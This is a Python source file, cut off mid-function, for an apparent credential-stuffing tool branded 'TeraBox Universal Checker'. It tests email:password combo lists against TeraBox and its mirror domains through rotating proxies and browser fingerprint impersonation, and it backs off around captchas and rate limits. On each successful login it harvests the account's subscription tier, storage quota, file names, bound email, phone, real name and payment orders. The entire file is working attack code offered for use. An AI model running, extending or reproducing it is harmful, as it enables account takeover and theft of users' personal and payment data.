import os
import re
import sys
import json
import time
import base64
import random
import string
import signal
import hashlib
import threading
import subprocess
import configparser
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = True
except ImportError:
    _EYELIFTER_HAVE_CFFI = False
    import requests as eyelifter_cffi

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5, AES
    _EYELIFTER_HAVE_CRYPTO = True
except ImportError:
    _EYELIFTER_HAVE_CRYPTO = False

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v70"
EYELIFTER_YEAR = "2026"

_F1T = "VGVyYUJveCBVbmk="
_F2T = "dmVyc2FsIENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "VEVSQUJPWF9AZXllbGlmdGVy"
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.terabox.seal")
_EYELIFTER_SEALED = None


def eyelifter_d(e):
    try:
        pad = "=" * (-len(e) % 4)
        return base64.b64decode(e + pad).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


EYELIFTER_TOOL      = eyelifter_j(_F1T, _F2T)
EYELIFTER_TG_USER   = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN   = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS   = eyelifter_j(_F1D)
EYELIFTER_TAG       = eyelifter_j(_F1G, _F2G)
EYELIFTER_SEAL_STR  = eyelifter_j(_F1S, _F2S)
EYELIFTER_LINE_TAG  = f"by {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}"
EYELIFTER_EXPECTED  = "TeraBox Universal Checker"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL != EYELIFTER_EXPECTED:
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USER != "@samvir1" or EYELIFTER_TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


def eyelifter_vlen(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def eyelifter_center(t, w):
    vl = eyelifter_vlen(t)
    if vl >= w:
        return t
    l = (w - vl) // 2
    return " " * l + t + " " * (w - vl - l)


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
       "VIP": ("32", True), "FREE": ("36", True), "CAPTCHA": ("33", True),
       "RATE": ("31", True), "LOCKED": ("35", True), "BAD": ("31", False),
       "LIVE": ("96", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_dbg(tag, msg):
    if not _EYELIFTER_CFG.settings.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, f"{msg} [eyelifter]")


def eyelifter_rline(i, t, st, txt, c, bold=False, whole=False):
    with _CL:
        if _ANSI:
            prefix = eyelifter_color("90", f"[{i}/{t}]")
            tag = eyelifter_color(c, st.ljust(7), True if bold else False)
            body = eyelifter_color(c, txt, True if bold else False) if whole else txt
            print(f"{prefix} {tag} {body}", flush=True)
        else:
            print(f"[{i}/{t}] {st.ljust(7)} {txt}", flush=True)


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    vl = eyelifter_vlen(lbl)
    side = max(1, (width - vl) // 2)
    print(eyelifter_color("90", "─" * side) +
          eyelifter_color("96", lbl, True) +
          eyelifter_color("90", "─" * (width - vl - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", eyelifter_center(title, width), True))
    if sub:
        print(eyelifter_color("2", eyelifter_center(sub, width)))
    print(eyelifter_color("5", eyelifter_center(
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}", width)))
    print(eyelifter_color("90", line * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96",
        f"═══ eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} ═══", True))
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(f"  {eyelifter_color('96', str(k).ljust(wk))}  "
                  f"{eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("TERABOX_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_terabox.ini"
)
EYELIFTER_RESULTS_DIR = os.path.join(
    os.environ.get("TERABOX_HOME") or os.path.dirname(os.path.abspath(__file__)),
    EYELIFTER_RESULTS
)
EYELIFTER_MAX_THREADS = 100
EYELIFTER_DEFAULT_THREADS = 20
EYELIFTER_APP_ID = "250528"

EYELIFTER_REGIONS = {
    "TB": {"name": "TeraBox",  "domain": "www.terabox.com",     "channel": "dubox"},
    "24": {"name": "1024Box",  "domain": "www.1024terabox.com", "channel": "dubox"},
    "DX": {"name": "Dubox",    "domain": "www.dubox.com",       "channel": "dubox"},
    "NP": {"name": "Nephobox", "domain": "www.nephobox.com",    "channel": "dubox"},
}

EYELIFTER_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
]

EYELIFTER_IMPERSONATE_POOL = [
    "chrome131", "chrome124", "chrome120", "chrome116", "chrome110",
]

_EYELIFTER_BADP_TTL = 300.0
_EYELIFTER_BADP_CLEAN_INTERVAL = 30.0

EYELIFTER_RATE_CODES = {100, 102, 33, 60, 201, 202, 203}
EYELIFTER_CAPTCHA_CODES = {104, 106, 460020, 460030}
EYELIFTER_LOCKED_CODES = {90, 91}
EYELIFTER_BAD_CODES = {400021, 400023, 18, 19}
EYELIFTER_NOACCT_CODES = {-6, 44, 27}

EYELIFTER_TIER_MAP = {0: "Free", 1: "VIP", 2: "VIP+", 3: "SVIP"}


class EyelifterConfig:
    def __init__(self, cf=EYELIFTER_CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.settings = self._eyelifter_defaults_inmemory()
        try:
            self.eyelifter_load()
        except Exception as e:
            sys.stderr.write(f"[eyelifter] config load failed, using defaults: {e}\n")

    @staticmethod
    def _eyelifter_defaults_inmemory():
        return {
            "region": "24",
            "threads": EYELIFTER_DEFAULT_THREADS,
            "timeout": 30,
            "proxies_file": "proxies.txt",
            "retries": 2,
            "retry_delay": 1.5,
            "combo_delay": 0.5,
            "rate_limit_delay": 15,
            "captcha_delay": 60,
            "skip_proxy_test": False,
            "open_channel_on_launch": True,
            "hit_spacer": True,
            "capture_extras": True,
            "debug": False,
        }

    def eyelifter_load(self):
        if not os.path.exists(self.config_file):
            try:
                self.eyelifter_default()
            except Exception:
                pass
        try:
            self.cp.read(self.config_file, encoding="utf-8")
        except Exception:
            try:
                self.eyelifter_default()
                self.cp.read(self.config_file, encoding="utf-8")
            except Exception:
                return
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        c = self.cp["eyelifter"]
        region = (c.get("region", "24") or "24").upper()
        if region not in EYELIFTER_REGIONS:
            region = "24"
        self.settings["region"] = region
        try:
            self.settings["threads"] = max(1, min(EYELIFTER_MAX_THREADS,
                c.getint("threads", EYELIFTER_DEFAULT_THREADS)))
        except (ValueError, TypeError):
            self.settings["threads"] = EYELIFTER_DEFAULT_THREADS
        try:
            self.settings["timeout"] = max(5, min(120, c.getint("timeout", 30)))
        except (ValueError, TypeError):
            self.settings["timeout"] = 30
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        try:
            self.settings["retries"] = max(0, min(5, c.getint("retries", 2)))
        except (ValueError, TypeError):
            self.settings["retries"] = 2
        try:
            self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        except (ValueError, TypeError):
            self.settings["retry_delay"] = 1.5
        try:
            self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.5)))
        except (ValueError, TypeError):
            self.settings["combo_delay"] = 0.5
        try:
            self.settings["rate_limit_delay"] = max(1, min(180, c.getint("rate_limit_delay", 15)))
        except (ValueError, TypeError):
            self.settings["rate_limit_delay"] = 15
        try:
            self.settings["captcha_delay"] = max(1, min(600, c.getint("captcha_delay", 60)))
        except (ValueError, TypeError):
            self.settings["captcha_delay"] = 60
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.settings["capture_extras"] = c.getboolean("capture_extras", True)
        self.settings["debug"] = c.getboolean("debug", False)

    def eyelifter_default(self):
        self.cp["eyelifter"] = {
            "region": "24",
            "threads": str(EYELIFTER_DEFAULT_THREADS),
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.5",
            "rate_limit_delay": "15",
            "captcha_delay": "60",
            "skip_proxy_test": "false",
            "open_channel_on_launch": "true",
            "hit_spacer": "true",
            "capture_extras": "true",
            "debug": "false",
        }
        try:
            with open(self.config_file, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass

    def eyelifter_save(self):
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        for k, v in self.settings.items():
            self.cp["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)


_EYELIFTER_CFG = EyelifterConfig()


def eyelifter_pick_impersonate():
    return random.choice(EYELIFTER_IMPERSONATE_POOL)


def eyelifter_build_session(proxy=None):
    to = _EYELIFTER_CFG.settings["timeout"]
    imp = eyelifter_pick_impersonate()
    if _EYELIFTER_HAVE_CFFI:
        try:
            s = eyelifter_cffi.Session(impersonate=imp, timeout=to)
        except Exception:
            try:
                s = eyelifter_cffi.Session(impersonate="chrome131", timeout=to)
            except Exception:
                s = eyelifter_cffi.Session(timeout=to)
    else:
        s = eyelifter_cffi.Session()
    s.verify = False
    s.headers.update({
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "user-agent": random.choice(EYELIFTER_UA_POOL),
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_parse_proxy(l):
    l = l.strip()
    if not l or l.startswith("#"):
        return None
    if l.startswith(("http://", "https://", "socks4://", "socks5://")):
        return l
    p = l.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if "@" in l:
        return f"http://{l}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 8}
        if _EYELIFTER_HAVE_CFFI:
            kw["impersonate"] = eyelifter_pick_impersonate()
        r = eyelifter_cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good = []
    done = [0]
    dead = [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total} proxies [eyelifter]")

    def probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            else:
                dead[0] += 1
            if done[0] % 20 == 0 or done[0] == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {done[0]}/{total} — {len(good)} live, {dead[0]} dead [eyelifter]")
        return ok

    with ThreadPoolExecutor(max_workers=min(80, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        eyelifter_log("⚠️", "WARN", "PROXY",
            f"0/{total} passed — running direct [eyelifter]")
    return good


_EYELIFTER_STOP = threading.Event()
_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()

_EYELIFTER_ST = {"checked": 0, "vip": 0, "free": 0, "bad": 0, "locked": 0,
                 "captcha": 0, "errors": 0, "rl": 0, "pfails": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = {}
_EYELIFTER_BADP_LAST_CLEAN = 0.0
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = 0.0

_EYELIFTER_VIP_F = None
_EYELIFTER_FREE_F = None
_EYELIFTER_BAD_F = None
_EYELIFTER_LOCKED_F = None
_EYELIFTER_CAPTCHA_F = None
_EYELIFTER_RATE_F = None
_EYELIFTER_ERR_F = None
_EYELIFTER_JSON_F = None
_EYELIFTER_FOLDER = None


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP, _EYELIFTER_BADP
    global _EYELIFTER_RLU, _EYELIFTER_BADP_LAST_CLEAN
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "vip": 0, "free": 0, "bad": 0, "locked": 0,
                         "captcha": 0, "errors": 0, "rl": 0, "pfails": 0}
        _EYELIFTER_START = time.time()
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = {}
        _EYELIFTER_BADP_LAST_CLEAN = 0.0
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = 0.0


def eyelifter_pick_proxy(exclude=None):
    global _EYELIFTER_BADP_LAST_CLEAN
    now = time.time()
    with _EYELIFTER_PK:
        if now - _EYELIFTER_BADP_LAST_CLEAN > _EYELIFTER_BADP_CLEAN_INTERVAL:
            for p in list(_EYELIFTER_BADP.keys()):
                if _EYELIFTER_BADP[p] <= now:
                    _EYELIFTER_BADP.pop(p, None)
            _EYELIFTER_BADP_LAST_CLEAN = now
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    now = time.time()
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP and _EYELIFTER_BADP[p] > now:
            return
        _EYELIFTER_BADP[p] = now + _EYELIFTER_BADP_TTL
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
            os.fsync(fh.fileno())
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _EYELIFTER_RLU
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = max(_EYELIFTER_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU - time.time()
        if gap <= 0:
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_pad_b64(b):
    b = b.strip().replace("\n", "").replace("\r", "")
    return b + "=" * (-len(b) % 4)


def eyelifter_urlsafe_to_std(b):
    return b.replace("-", "+").replace("_", "/")


def eyelifter_aes_decrypt_pp1(pp1, pp2):
    std = eyelifter_pad_b64(eyelifter_urlsafe_to_std(pp1))
    iv = std[:16].encode("utf-8")
    ct = base64.b64decode(eyelifter_pad_b64(std[16:]))
    key = eyelifter_pad_b64(pp2).encode("utf-8")
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    pl = pt[-1]
    if 1 <= pl <= 16 and pt[-pl:] == bytes([pl]) * pl:
        pt = pt[:-pl]
    return pt


def eyelifter_h_transform(s):
    if not s:
        return s
    return s + ("0" + str(len(s)) if len(s) < 10 else str(len(s)))


def eyelifter_extract_jsToken(html):
    m = re.search(r'"jsToken"\s*:\s*"([^"]{50,})"', html)
    if not m:
        return None
    raw = m.group(1)
    for _ in range(3):
        if "%" in raw and len(raw) > 20:
            try:
                import urllib.parse
                d = urllib.parse.unquote(raw)
                if d == raw:
                    break
                raw = d
            except Exception:
                break
        else:
            break
    fm = re.search(r'fn\s*\(\s*["\']([A-Fa-f0-9]+)["\']\s*\)', raw)
    return fm.group(1) if fm else None


def eyelifter_extract_pcftoken(html):
    for pat in (
        r'"pcftoken"\s*:\s*"([a-f0-9]{32})"',
        r'pcftoken["\']?\s*[:=]\s*["\']([a-f0-9]{32})["\']',
    ):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def eyelifter_extract_bdstoken(html):
    for pat in (
        r'"bdstoken"\s*:\s*"([a-f0-9]{32})"',
        r'"bdstoken"\s*:\s*"([^"]+)"',
    ):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def eyelifter_make_dp_logid():
    return str(int(time.time() * 1000)) + f"{random.randint(0, 9999999):07d}"


def eyelifter_cookies_dict(s):
    try:
        return dict(s.cookies.items())
    except Exception:
        pass
    try:
        return s.cookies.get_dict()
    except Exception:
        return {}


def eyelifter_base_domain(url):
    host = url.replace("https://", "").replace("http://", "").strip("/")
    return host.split("/")[0]


def eyelifter_build_shard(www_url, prefix):
    host = eyelifter_base_domain(www_url)
    parts = host.split(".")
    if len(parts) >= 2:
        root = ".".join(parts[-2:])
        return f"{prefix}.{root}"
    return host


def eyelifter_age_str(ts):
    if not ts:
        return "-"
    try:
        ts = int(ts)
    except Exception:
        return "-"
    if ts <= 0:
        return "-"
    d = int(time.time()) - ts
    if d < 0:
        return "-"
    y, d = divmod(d, 31536000)
    mo, d = divmod(d, 2592000)
    day = d // 86400
    if y:
        return f"{y}y{mo}m"
    if mo:
        return f"{mo}m{day}d"
    return f"{day}d"


def eyelifter_days_left(ts):
    if not ts:
        return 0
    try:
        return max(0, (int(ts) - int(time.time())) // 86400)
    except Exception:
        return 0


def eyelifter_hsize(n):
    if not n:
        return "0B"
    try:
        n = float(n)
    except Exception:
        return "?"
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.2f}{unit}"
        n /= 1024
    return f"{n:.2f}PB"


def eyelifter_ts_date(ts):
    if not ts:
        return "-"
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc).strftime("%Y-%m-%d")
    except Exception:
        return "-"


def eyelifter_fmt_files(files):
    if not files:
        return "-"
    nf = files.get("files", 0)
    nd = files.get("folders", 0)
    fs = f"{nf} file" + ("s" if nf != 1 else "")
    ds = f"{nd} folder" + ("s" if nd != 1 else "")
    return f"{fs}, {ds}"


class EyelifterWarm:
    def __init__(self, region):
        self.region = region
        reg = EYELIFTER_REGIONS[region]
        self.base = f"https://{reg['domain']}"
        self.channel = reg["channel"]
        self.ua = random.choice(EYELIFTER_UA_POOL)
        self.impersonate = eyelifter_pick_impersonate()
        self.ok = False

    def build(self, proxy=None):
        s = eyelifter_build_session(proxy)
        s.headers.update({"user-agent": self.ua})
        try:
            s.get(f"{self.base}/login", timeout=25)
            self.ok = True
        except Exception:
            self.ok = False
        return self


def eyelifter_session_warm(s, warm):
    r = s.get(f"{warm.base}/login", timeout=25)
    js_token = eyelifter_extract_jsToken(r.text) or ""
    pcftoken = eyelifter_extract_pcftoken(r.text) or ""
    ck = eyelifter_cookies_dict(s)
    browserid = ck.get("browserid", "")
    return {"js_token": js_token, "pcftoken": pcftoken, "browserid": browserid}


class EyelifterTokServer:
    def __init__(self, region):
        self.region = region
        self.warm = None

    def start(self, domain=None):
        self.warm = EyelifterWarm(self.region)
        self.warm.build()
        if not self.warm.ok:
            raise RuntimeError("startup warmup failed")

    def ping(self, timeout=3):
        return self.warm is not None and self.warm.ok

    def stop(self):
        pass


def eyelifter_get_pubkey(s, warm, loc):
    q = {"app_id": EYELIFTER_APP_ID, "web": "1", "channel": warm.channel,
         "clienttype": "0", "dp-logid": eyelifter_make_dp_logid()}
    if loc["js_token"]:
        q["jsToken"] = loc["js_token"]
    b = {"client": "web", "pass_version": "2.8", "lang": "en",
         "clientfrom": "h5", "pcftoken": loc["pcftoken"]}
    r = s.post(f"{warm.base}/passport/getpubkey", params=q, data=b,
               headers={"origin": warm.base, "referer": f"{warm.base}/login"}, timeout=20)
    try:
        return r.json(), None
    except Exception:
        return None, r


def eyelifter_prelogin(s, warm, email, loc):
    q = {"app_id": EYELIFTER_APP_ID, "web": "1", "channel": warm.channel,
         "clienttype": "0", "dp-logid": eyelifter_make_dp_logid()}
    if loc["js_token"]:
        q["jsToken"] = loc["js_token"]
    b = {"client": "web", "pass_version": "2.8", "lang": "en",
         "clientfrom": "h5", "pcftoken": loc["pcftoken"], "email": email}
    r = s.post(f"{warm.base}/passport/prelogin", params=q, data=b,
               headers={"origin": warm.base, "referer": f"{warm.base}/login"}, timeout=20)
    return r.json()


def eyelifter_do_login(s, warm, loc, email, pwd_enc, seval, prand, random_val, server_ts):
    q = {"app_id": EYELIFTER_APP_ID, "web": "1", "channel": warm.channel,
         "clienttype": "0", "dp-logid": eyelifter_make_dp_logid()}
    if loc["js_token"]:
        q["jsToken"] = loc["js_token"]
    b = {"client": "web", "pass_version": "2.8", "lang": "en",
         "clientfrom": "h5", "pcftoken": loc["pcftoken"],
         "email": email, "pwd": pwd_enc,
         "seval": seval, "prand": prand,
         "random": str(random_val), "timestamp": str(server_ts)}
    r = s.post(f"{warm.base}/passport/login", params=q, data=b,
               headers={"origin": warm.base, "referer": f"{warm.base}/login"}, timeout=25)
    try:
        return r.json(), r
    except Exception:
        return None, r


def eyelifter_capture(s, warm, loc, email, password, ck, dm_host):
    out = {"email": email, "password": password, "region": warm.region}
    DM = f"https://{dm_host}"
    bdstoken = ck.get("bdstoken", "")
    q_common = {
        "app_id": EYELIFTER_APP_ID, "web": 1, "channel": warm.channel,
        "clienttype": 0, "bdstoken": bdstoken, "dp-logid": eyelifter_make_dp_logid(),
    }
    if loc["js_token"]:
        q_common["jsToken"] = loc["js_token"]

    try:
        r = s.get(f"{DM}/api/check/login",
                  params={"app_id": EYELIFTER_APP_ID, "web": 1, "channel": warm.channel,
                          "clienttype": 0, "bdstoken": bdstoken},
                  headers={"referer": f"{DM}/ai/index"}, timeout=15)
        j = r.json()
        out["uk"] = j.get("uk") or 0
    except Exception:
        out["uk"] = 0

    try:
        r = s.get(f"{DM}/rest/2.0/membership/proxy/user",
                  params={**q_common, "method": "query", "membership_version": "1.0",
                          "client": "web", "pass_version": "2.8", "lang": "en",
                          "clientfrom": "h5", "pcftoken": loc["pcftoken"] or ""},
                  headers={"referer": f"{DM}/ai/index"}, timeout=20)
        j = r.json()
        d = j.get("data") or {}
        mi = d.get("member_info") or {}
        rc = d.get("reg_country") or {}
        out["user"] = {
            "is_vip": mi.get("is_vip"),
            "is_vip_level": mi.get("is_vip_level"),
            "vip_end_time": mi.get("vip_end_time"),
            "vip_left_time": mi.get("vip_left_time"),
            "is_auto_renew": mi.get("is_auto_renew"),
            "renew_price": mi.get("renew_price"),
            "raw_price": mi.get("raw_price"),
            "price_currency": mi.get("price_currency"),
            "sign_product_name": mi.get("sign_product_name"),
            "has_iap_record": mi.get("has_iap_record"),
            "platform": mi.get("platform"),
            "country": rc.get("name") or (d.get("cur_country") or {}).get("name"),
            "support_vip": rc.get("support_vip"),
        }
    except Exception:
        pass

    try:
        r = s.get(f"{DM}/rest/2.0/membership/proxy/point",
                  params={**q_common, "method": "balance", "point_code": "CREDIT",
                          "need_detail": "false", "app_key": "HHTV3A"},
                  headers={"referer": f"{DM}/ai/index"}, timeout=15)
        j = r.json()
        pi = j.get("point_info") or {}
        out["points"] = pi.get("available", 0)
        out["points_total"] = pi.get("total", 0)
    except Exception:
        pass

    try:
        r = s.get(f"{DM}/api/quota", params=q_common,
                  headers={"referer": f"{DM}/ai/index"}, timeout=15)
        j = r.json()
        out["quota"] = {
            "total": j.get("total"),
            "used": j.get("used"),
            "free": j.get("free"),
            "init_quota_type": (j.get("extra") or {}).get("init_quota_type"),
        }
    except Exception:
        pass

    try:
        r = s.get(f"{DM}/api/list",
                  params={**q_common, "dir": "/", "order": "time", "desc": 1,
                          "num": 100, "page": 1, "recursion": 0, "method": "list"},
                  headers={"referer": f"{DM}/ai/index"}, timeout=20)
        j = r.json()
        files = j.get("list") or []
        out["files"] = {
            "total": len(files),
            "files": sum(1 for f in files if not f.get("isdir")),
            "folders": sum(1 for f in files if f.get("isdir")),
            "names": [f.get("server_filename") for f in files[:5]],
        }
    except Exception:
        pass

    uk = out.get("uk", 0)
    if uk:
        try:
            r = s.get(f"{DM}/api/user/getinfo",
                      params={**q_common, "user_list": json.dumps([str(uk)]),
                              "need_relation": 0, "need_secret_info": 1},
                      headers={"referer": f"{DM}/ai/index"}, timeout=15)
            j = r.json()
            recs = j.get("records") or []
            if recs:
                r0 = recs[0]
                out["profile"] = {
                    "bound_email": r0.get("email"),
                    "bound_phone": r0.get("phone"),
                    "real_name": r0.get("real_name"),
                    "login_type": r0.get("login_type"),
                    "vip_type": r0.get("vip_type"),
                    "mask_uname": r0.get("mask_uname"),
                }
        except Exception:
            pass

    try:
        r = s.get(f"{DM}/rest/2.0/membership/proxy/order",
                  params={"app_id": EYELIFTER_APP_ID, "web": 1, "channel": warm.channel,
                          "clienttype": 0, "method": "list", "filter": "193",
                          "bdstoken": bdstoken, "devuid": loc["browserid"]},
                  headers={"referer": f"{DM}/cloud-storage-pricing-plans/user-center"},
                  timeout=20)
        j = r.json()
        if j.get("error_code") == 0:
            orders = (j.get("data") or {}).get("order_infos") or []
            out["orders"] = {
                "count": len(orders),
                "last_paid": orders[0].get("actual_pay") if orders else 0,
                "last_price": orders[0].get("sign_price") if orders else 0,
                "pay_way": orders[0].get("pay_way") if orders else None,
                "sub_id": orders[0].get("serial_no") if orders else None,
                "last_time": orders[0].get("create_time") if orders else 0,
            }
    except Exception:
        pass

    return out


def eyelifter_check(combo, srv, region, proxy=None):
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    warm = srv.warm
    if warm is None or not warm.ok:
        return {"status": "error", "error_type": "no_warm", "reason": "warm not ready",
                "email": email, "password": password}

    s = eyelifter_build_session(proxy)
    s.headers.update({"user-agent": warm.ua})

    try:
        loc = eyelifter_session_warm(s, warm)
    except Exception as e:
        return {"status": "error", "error_type": f"net_{type(e).__name__}",
                "reason": "warm_net", "email": email, "password": password}

    if not (loc["js_token"] and loc["pcftoken"] and loc["browserid"]):
        return {"status": "error", "error_type": "warmup_fail",
                "reason": "missing jsToken/pcftoken/browserid",
